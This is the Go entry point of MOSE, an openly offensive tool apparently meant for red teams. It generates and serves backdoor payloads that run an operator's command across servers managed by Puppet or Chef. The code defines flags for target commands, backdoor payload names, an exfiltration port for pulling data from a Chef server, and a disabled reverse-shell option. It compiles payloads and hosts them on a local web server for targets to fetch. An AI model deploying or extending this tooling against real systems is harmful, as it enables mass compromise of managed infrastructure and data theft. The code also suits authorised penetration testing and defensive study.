// Copyright 2019 National Technology & Engineering Solutions of Sandia, LLC (NTESS).
// Under the terms of Contract DE-NA0003525 with NTESS,
// the U.S. Government retains certain rights in this software.

package main

import (
	"context"
	"encoding/json"
	"flag"
	"log"
	"os"
	"path"
	"path/filepath"
	"strings"
	"text/template"
	"time"

	"github.com/fatih/color"
	"github.com/gobuffalo/packr/v2"
	utils "github.com/l50/goutils"
	"github.com/master-of-servers/mose/pkg/moseutils"
)

var (
	cmd        string
	webSrvPort = 8090
	exfilPort  = 9090
	cmTarget   string
	errmsg     = color.Red
	msg        = color.Green
	info       = color.Yellow
	osArch     string
	osTarget   string
	localIP    string
	//revShell          bool
	payloadName       string
	filePath          string
	cmdFileUpload     string
	cmdUploadPath     string
	imageName         = "mose/chef-workstation"
	chefNodeName      string
	chefClientKey     string
	chefValidationKey string
	targetIP          string
	attackOrgName     string
	targetOrgName     string
	timeToServe       int
	serveSSL          bool
	sslCertPath       string
	sslKeyPath        string
	settingsPath      string
	verbose           bool
	noserve           bool
	rhost             string
	cleanupFile       string
	puppetBackupLoc   string
	containerName     string
)

type cliArgs struct {
	BdCmd           string
	LocalIP         string
	KeyName         string
	NodeName        string
	OrgName         string
	OsTarget        string
	PayloadName     string
	TargetIP        string
	UserOrgName     string
	ValidKey        string
	WebSrvPort      string
	UploadFilename  string
	ServeSSL        bool
	ExfilPort       int
	UploadFilePath  string
	CleanupFile     string
	PuppetBackupLoc string
}

// init specifies the input parameters that mose can take.
func init() {
	flag.StringVar(&cmd, "c", "", "Command to run on the targets.")
	flag.StringVar(&localIP, "l", "", "Local IP Address.")
	flag.StringVar(&cmTarget, "t", "puppet", "Configuration management tool to target.")
	flag.StringVar(&osArch, "a", "amd64", "Architecture that the target CM tool is running on.")
	flag.StringVar(&osTarget, "o", "linux", "Operating system that the target CM tool is on.")
	//flag.BoolVar(&revShell, "r", false, "Drop into msf reverse shell listener.")
	flag.StringVar(&payloadName, "m", "my_cmd", "Name for backdoor payload")
	flag.StringVar(&filePath, "f", "", "Store binary at <filepath>")
	flag.StringVar(&settingsPath, "s", "settings.json", "Json file to load for mose")
	flag.BoolVar(&serveSSL, "ssl", false, "Serve payload over TLS")
	flag.IntVar(&webSrvPort, "p", 443, "Port used to serve payloads on (default 443 with ssl, 8090 without)")
	flag.IntVar(&exfilPort, "ep", 443, "Port used to exfil data from chef server (default 443 with ssl, 9090 without)")
	flag.BoolVar(&verbose, "v", false, "Display verbose output")
	flag.BoolVar(&noserve, "ns", false, "Disable serving of payload")
	flag.StringVar(&rhost, "rhost", "", "Set the remote host for /etc/hosts in the chef workstation	container (format is hostname:ip)")
	flag.StringVar(&cmdFileUpload, "fu", "", "File upload option")
	flag.IntVar(&timeToServe, "tts", 60, "Number of seconds to serve the payload")
}

func initSettings(file string) {
	settings := moseutils.LoadSettings(file)

	if verbose {
		log.Print("Json configuration loaded with the following values")
		b, err := json.MarshalIndent(settings, "", "  ")
		if err == nil {
			log.Println(string(b))
		}
	}

	sslCertPath = settings.SslCertPath
	sslKeyPath = settings.SslKeyPath
	chefClientKey = settings.ChefClientKey
	chefNodeName = settings.ChefNodeName
	chefValidationKey = settings.ChefValidationKey
	attackOrgName = settings.AttackOrgName
	targetOrgName = settings.TargetOrgName
	targetIP = settings.TargetIP
	cleanupFile = settings.CleanupFile
	puppetBackupLoc = settings.PuppetBackupLoc
	containerName = settings.ContainerName

	if rhost == "" {
		rhost = settings.RemoteHosts
	}

	cmdUploadPath = settings.UploadFilePath
}

// usage prints the usage instructions for mose.
func usage() {
	os.Args[0] = os.Args[0] + " [options]"
	flag.Usage()
	os.Exit(1)
}

// validateInput ensures that the user inputs proper arguments into mose.
func validateInput() bool {
	if cmd == "" && cmdFileUpload == "" {
		errmsg("You must specify a cm target, a command, and an operating system.")
		errmsg("Example: mose -t puppet -c pwd -o Linux")
		errmsg("Alternatively, you can specify a reverse shell instead of a command.")
		errmsg("Example: mose -t chef -revShell -o Linux")
		return false
	}
	return true
}

func generateParams() {
	cliArgs := cliArgs{
		BdCmd:           cmd,
		LocalIP:         localIP,
		OsTarget:        osTarget,
		PayloadName:     payloadName,
		NodeName:        chefNodeName,
		KeyName:         "",
		OrgName:         targetOrgName,
		UserOrgName:     attackOrgName,
		ValidKey:        filepath.Base(chefValidationKey),
		TargetIP:        targetIP,
		UploadFilename:  "",
		ServeSSL:        serveSSL,
		ExfilPort:       exfilPort,
		UploadFilePath:  cmdUploadPath,
		CleanupFile:     cleanupFile,
		PuppetBackupLoc: puppetBackupLoc,
	}
	if chefClientKey != "" {
		cliArgs.KeyName = filepath.Base(chefClientKey)
	}
	if chefValidationKey != "" {
		cliArgs.ValidKey = filepath.Base(chefValidationKey)
	}
	if cmdFileUpload != "" {
		cliArgs.UploadFilename = filepath.Base(cmdFileUpload)
	}
	paramLoc := filepath.Join("templates", cmTarget)
	box := packr.New("Params", "|")
	box.ResolutionDir = paramLoc

	// Generate the params for a given target
	s, err := box.FindString("params.tmpl")

	if err != nil {
		log.Fatal(err)
	}

	t, err := template.New("params").Parse(s)

	if err != nil {
		log.Fatal(err)
	}

	f, err := os.Create("cmd/mose/" + cmTarget + "/params.go")

	if err != nil {
		log.Fatalln(err)
	}

	err = t.Execute(f, cliArgs)

	f.Close()

	if err != nil {
		log.Fatal("Execute: ", err)
	}

	dir, _ := path.Split(filePath)

	// Check if dir exists and filePath isn't empty
	if _, err := os.Stat(dir); os.IsNotExist(err) && dir != "" && filePath != "" {
		log.Fatal("Location " + filePath + " does not exist")
	}

	if dir == "" && filePath != "" {
		dir, err := os.Getwd()
		if err != nil {
			log.Fatal("Couldn't get current working directory")
		}

		filePath = filepath.Join(dir, filePath)
	}

	// Set port option
	if !serveSSL && webSrvPort == 443 {
		webSrvPort = 8090
	}
}

func generatePayload() {
	msg("Generating %s payload to run %s on a %s system, please wait...", cmTarget, cmd, strings.ToLower(osTarget))
	prevDir := utils.Gwd()
	moseutils.Cd(filepath.Clean(filepath.Join("cmd/mose/", cmTarget)))
	fPayload := filepath.Join("../../../payloads", cmTarget+"-"+strings.ToLower(osTarget))

	if verbose {
		log.Printf("fPayload = %s", fPayload)
		log.Printf("cmTarget = %s", cmTarget)
		log.Printf("osTarget = %s", osTarget)
		log.Printf("cmdFileUpload = %s", cmdFileUpload)
	}

	if cmdFileUpload != "" && filePath == "" {
		log.Printf("cmdFileUpload specified, copying file to payloads destination")
		moseutils.CpFile(cmdFileUpload, filepath.Join("../../../payloads", filepath.Base(cmdFileUpload)))
	}

	if filePath != "" {
		msg("Creating binary at: " + filePath)
		fPayload = filePath
	}

	res, err := utils.RunCommand("env", "GOOS="+strings.ToLower(osTarget), "GOARCH=amd64", "go", "build", "-o", fPayload)
	if verbose {
		log.Printf("env GOOS=" + strings.ToLower(osTarget) + " GOARCH=amd64" + " go" + " build" + " -o " + fPayload)
	}
	if err != nil {
		log.Fatalf("Error running the command to generate the target payload: %v", err)
	}

	if verbose {
		log.Println(res)
	}
	moseutils.Cd(prevDir)
}

func setLocalIP() {
	if localIP == "" {
		ip, err := moseutils.GetLocalIP()
		localIP = ip
		if err != nil {
			log.Fatalln(err)
		}
	}
}

func servePayload(port int, ssl bool) {
	proto := "http"
	if ssl {
		proto = "https"
	}

	if cmdFileUpload != "" {
		msg("File upload command specified, being served at %s://%s:%d/files.tar for %d seconds", proto, localIP, port, timeToServe)
	} else {
		msg("Payload being served at %s://%s:%d/%s-%s for %d seconds", proto, localIP, port, cmTarget, strings.ToLower(osTarget), timeToServe)
	}

	srv := moseutils.StartServer(port, "payloads", ssl, sslCertPath, sslKeyPath, time.Duration(timeToServe)*time.Second, true)

	info("Web server shutting down...")

	if err := srv.Shutdown(context.Background()); err != nil {
		log.Fatalln(err)
	}
}

func main() {
	flag.Parse()
	initSettings(settingsPath)

	if flag.NFlag() == 0 || !validateInput() {
		usage()
	}
	setLocalIP()
	generateParams()
	generatePayload()
	// If the user hasn't specified a prefence to output the payload to a file
	// for transfer, then serve it
	if cmdFileUpload != "" {
		targetBin := filepath.Join("payloads", cmTarget+"-"+strings.ToLower(osTarget))
		files := []string{filepath.Join("payloads", filepath.Base(cmdFileUpload)), targetBin}
		log.Printf("Compressing files %v into payloads/files.tar", files)
		moseutils.TarFiles(files, "payloads/files.tar")
	}
	if filePath == "" && !noserve {
		servePayload(webSrvPort, serveSSL)
	}
	if cmTarget == "chef" {
		ans1, err := moseutils.AskUserQuestion("Is your target a chef workstation?", osTarget)
		if err != nil {
			log.Fatal("Quitting")
		}
		if ans1 {
			log.Println("Nothing left to do on this system, continue all remaining activities on the target workstation.")
			os.Exit(0)
		}

		ans2, err := moseutils.AskUserQuestion("Is your target a chef server?", osTarget)
		if err != nil {
			log.Fatal("Quitting")
		}
		if ans2 {
			setupChefWorkstationContainer(localIP, exfilPort, osTarget)
			os.Exit(0)
		}

		if !ans1 && !ans2 {
			log.Printf("Invalid chef target")
		}
	}
}
